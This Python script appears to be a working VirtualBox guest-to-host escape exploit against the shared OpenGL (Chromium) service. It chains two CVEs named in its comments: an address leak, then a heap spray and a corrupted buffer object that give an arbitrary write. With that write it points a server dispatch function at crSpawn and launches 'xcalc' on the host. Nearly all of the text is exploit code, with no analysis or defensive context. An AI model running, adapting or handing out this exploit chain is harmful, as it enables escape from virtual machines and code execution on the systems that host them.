import sys, os
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
from chromium import *

def nop_msg():
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        + "\x00\x00\x00" +chr(CR_NOP_OPCODE)
        + pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141)
        )
    return msg

def make_leak_msg(offset):
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) #type, conn_id, numOpcodes
        + "\x00\x00\x00" +chr(CR_EXTEND_OPCODE) #opcode
        + pack("<I", offset) #packet_length
        + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE) #sub opcode
        + pack("<I", 0x41424344)
        )
    return msg

def make_readpixels_msg(uiId, uiSize):#x, y, width, height, formata, ttype, pixels):
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) #type, conn_id, numOpcodes
        + "\x00\x00\x00" +chr(CR_READPIXELS_OPCODE) #opcode
        + pack("<IIIIII", 0, 0, 0, 8, 0x35, 0) #x,y,w,h, format, type
        + pack("<IIIIIIII", 0,0,0,0,0x1ffffffd, 0, uiId, uiSize) # stride, align, skipR, skipPix, byteperrow, rowlen
        )
    return msg

def make_crSpawn_msg(cmd, argv):
    msg = (
        pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) #type, conn_id, numOpcodes
        + "\x00\x00\x00" +chr(CR_BOUNDSINFOCR_OPCODE) #opcode
        + pack("<I", 1)
        + cmd.ljust(16, "\x00")
        + pack("<I", 0)
        + pack("<QQ", argv, 0) # argv : execute string, null
        )
    return msg

def leak_address(client):
    leak_success = False;
    while not leak_success:
        for i in range(0, 10):
            print("Connect VBoxSharedCrOpenGL.")
            leak_client = hgcm_connect("VBoxSharedCrOpenGL")
            hgcm_disconnect(leak_client)

        raw_input("next?")

        msg = make_leak_msg(0x100000000-0x9b8)
        result = crmsg(client, msg)

        print(result[:0x40].encode("hex"))

        if "\x7f\x00\x00" in result:
            leak = unpack('<Q', result[16:24])[0]
            print("leak: {}".format(hex(leak)))
            if (leak%0x1000 == 0x170):
                leak_success = True
                break
        
        raw_input("next2?")
        

    cr_server = leak - 0x4a70

    print("cr_server: {}".format(hex(cr_server)))
    raw_input("leak 2")

    # can't search ptr in my env    

    leak_clients = []

    leak_success = False;
    while not leak_success:
        msg = nop_msg()
        buf_ids = []
        for i in range(60):
            buf_ids.append(alloc_buf(client, 0x298, msg))
        
        for i in range(0, 15):
            leak_client = hgcm_connect("VBoxSharedCrOpenGL")
            leak_clients.append(leak_client)
            
        msg = make_leak_msg(0x100000000-0x9f0 + 0x10)
        result = crmsg(client, msg, 0x298)

        for idx in buf_ids:
            hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [idx, "A"*0x298, 0])

        for leak_client in leak_clients:
            try:
                hgcm_disconnect(leak_client)
            except:
                pass

        if "\x7f\x00\x00" in result:
            leak = unpack('<Q', result[16:24])[0]
            print("leak: {}".format(hex(leak)))
            if (leak%0x1000 == 0x9d0):
                leak_success = True
                break
    crSpawn = leak - 0xc2d0




    raw_input("k?")

    # crSpawn = 0x11223344
    return (cr_server, crSpawn)
    
def heapSpray(client):
    buf_ids = []
    spray_ids = []
    msg = nop_msg()
    # make CRVBOXSVCBUFFER_t & pData heapSpray area

    for i in range(1, 200):
        print("alloc {}.".format(i * 0x10))
        for j in range(180):
            alloc_buf(client, 0x10 + 0x10 * i, msg)

    for i in range(2000):
        alloc_buf(client, 0x20, msg)


    fengshui_buf_ids = []
    for i in range(1000):
       fengshui_buf_ids.append(alloc_buf(client, 0x20, msg))

    # for idx in fengshui_buf_ids[200: 900]:
    #     hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [idx, "A"*0x20, 0])


    for i in range(4000):
        alloc_buf(client, 0x20, msg)

    raw_input("clean heap done.")

    for i in range(120):
        buf_ids.append(alloc_buf(client, 0x20, msg))
    buf_ids = buf_ids[::-1] # reverse, because fastbin is LIFO
    

    for i in range(120):
       alloc_buf(client, 0x20, msg)

    raw_input("try to make hole...")

    # even buf_ids free
    for idx in buf_ids[::2]:
        hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [idx, "A"*0x20, 0])
    

    for i in range(40):
        alloc_buf(client, 0x20, msg)


    # fill CRVBOXSVCBUFFER_t free areas
    for i in range(40):
        spray_ids.append(alloc_buf(client, 0x50, msg))
        alloc_buf(client, 0x20, msg)
    
    # make a hole between spray area
    for idx in spray_ids[::-2]:
        hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [idx, "A"*0x20, 0])

def make_corrupt_obj(pData):
    obj = (
        "A"*0x28
        + pack("<Q", 0x35)
        + pack("<I", 0xcafebabe) #uiId
        + pack("<I", 0xffffffff) #uiSize
        + pack("<Q", pData) # table_addr
        )
    return obj

def write_anywhere(addr, data):
    #make corrupt obj
    fake_buffer = make_corrupt_obj(addr)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0, fake_buffer])
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xcafebabe, 0xffffffff, 0, data])

if __name__=='__main__':
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client) #must use
    
    # Trigger to CVE-2019-2525
    cr_server, crSpawn = leak_address(client)
    crServerDispatchBoundsInfoCR = cr_server+0xae98
    
    print("[*] crServer : " + hex(cr_server))
    print("[*] crSpawn  : " + hex(crSpawn))

    

    #print("[*] crServerDispatchBoundsInfoCR : " + hex(crServerDispatchBoundsInfoCR))
    
    # heapSpray
    heapSpray(client)
    
    # Trigger to CVE-2019-2548
    msg = make_readpixels_msg(0xdeadbeef, 0xffffffff)
    crmsg(client, msg)
    #a = input("test1 : ")
   
    # setting "xcalc"
    xcalc_string = cr_server + 0xc410 
    write_anywhere(xcalc_string, "xcalc")
    print("[+] setting execute string ['xcalc'] : " + hex(xcalc_string))
    raw_input("next?")

    # overwrite talbe func crSpawn
    print("[+] overwriting crServerDispatchBoundsInfoCR to crSpawn")
    write_anywhere(crServerDispatchBoundsInfoCR, pack("<Q", crSpawn))

    # escape!! execute xcalc
    msg = make_crSpawn_msg("xcalc", xcalc_string)
    crmsg(client, msg)

    hgcm_disconnect(client) 

